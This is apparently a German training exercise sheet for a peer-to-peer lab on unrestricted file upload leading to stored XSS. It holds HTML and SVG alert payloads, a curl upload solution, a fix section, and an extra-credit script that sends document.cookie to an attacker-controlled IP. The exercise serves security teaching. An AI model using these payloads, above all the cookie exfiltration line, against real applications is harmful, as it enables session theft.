# Challenge: Unrestricted File Upload (Datei wird zur Waffe)

Ziel dieser Übung: Zeigt, dass ein Upload ohne Typprüfung gefährlich ist, wenn
die Datei danach **im Ursprung der App** ausgeliefert wird. Ihr ladet eine
„Datei" hoch, die beim Öffnen JavaScript **im App-Kontext** ausführt.

**Aufbau:** Jede:r startet die App auf dem **eigenen** Rechner; der/die
**Nachbar:in** greift diese Instanz an.

> ```powershell
> $env:HOST = "0.0.0.0"; python app.py        # http://<deine-ip>:5006
> ```

---

## Spielregeln

- Nur die eingeladene Instanz. Nur fiktive, harmlose Dateien (`alert`).
- Kein DoS, keine echten Schad-Dateien, keine Massen-Uploads.
- Nur während des Übungstermins. Lösungsweg kurz dokumentieren.

---

## Szenario

Das Upload-Feld nimmt **jede** Datei an und liefert sie danach unter
`/uploads/<name>` wieder aus — mit dem **Content-Type passend zur Endung**. Eine
`.html` wird also als Webseite im **selben Ursprung** wie die App angezeigt.

## Aufgabe

Lade eine Datei hoch, die beim **Öffnen** JavaScript ausführt (sichtbar durch
`alert('XSS')`) — und zwar auf `http://ZIEL:5006/uploads/...`, also im Origin der
Anwendung.

## Hinweis

- Keine Bild-/Typprüfung → die Endung bestimmt, wie der Browser die Datei
  behandelt. Was passiert bei **`.html`** oder **`.svg`**?
- Lege eine Datei `pwn.html` an mit:
  ```html
  <script>alert('XSS')</script>
  ```
  hochladen, dann den Link `/uploads/pwn.html` öffnen.
- SVG geht auch:
  ```xml
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')"></svg>
  ```

## Erfolgskriterium

- Beim Öffnen deiner hochgeladenen Datei feuert `alert('XSS')`.
- Die Seite läuft unter `/uploads/...`, also im **Origin der App** (dadurch wären
  App-Cookies/Session angreifbar).

## Zählt **nicht** als Lösung

- Eine `.html` lokal im Browser öffnen (nicht über `/uploads/` vom Server).
- Nur ein Bild hochladen, das nichts ausführt.

## Kür (Impact)

Weil die Datei im App-Origin läuft, kann sie App-Cookies lesen/abschicken
(sofern nicht `HttpOnly`). In `pwn.html`:
```html
<script>new Image().src='http://DEINE-IP:8000/klau?c='+encodeURIComponent(document.cookie)</script>
```

---

## Verteidigung / Fix

- **Ursache:** keine Typ-/Inhaltsprüfung + Auslieferung im App-Origin mit
  rate-barem Content-Type.
- **Fix:** **Allowlist** erlaubter Typen (z. B. nur Bilder), Inhalt validieren,
  Dateien **umbenennen** (keine vom Nutzer gewählte Endung), mit festem,
  harmlosem Content-Type und `Content-Disposition: attachment` ausliefern — am
  besten von einer **anderen Origin**/Domain. Uploads nie ausführbar ablegen.

<details>
<summary>Lösungsweg (für Lehrende / nach der Übung)</summary>

```bash
printf "<script>alert('XSS')</script>" > pwn.html
curl -F "datei=@pwn.html" http://127.0.0.1:5006/
# dann im Browser öffnen:
#   http://127.0.0.1:5006/uploads/pwn.html   -> Alert feuert (Content-Type text/html)
```
</details>
